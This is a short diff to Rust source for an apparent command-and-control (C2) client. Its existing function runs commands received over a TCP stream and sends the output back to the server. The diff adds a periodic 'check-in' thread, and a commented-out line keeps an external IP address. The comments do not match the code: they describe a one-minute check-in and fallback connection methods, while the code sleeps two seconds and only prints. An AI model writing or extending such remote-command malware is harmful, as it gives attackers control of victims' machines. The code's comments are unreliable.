@@ -84,11 +84,22 @@ fn c2(ip:&str) {
         let output = run_command(&recv); //run this
         stream.write(&output.as_bytes()).unwrap(); //send that shit
     }
-}       
+}
+
+//function to check-in with the server every minute. if it can't connect, the client will try other methods to connect
+fn checkIn(){
+    thread::spawn(|| {
+        loop{
+            thread::sleep(time::Duration::from_millis(2000)); //sleep for 2 seconds
+            println!("{}","checking in!");
+        }
+    });
+}
 
 
 fn main(){
     // let ip = "129.21.49.57:5678";
     let ip = "127.0.0.1:8080";
+    checkIn();
     c2(&ip);
 }
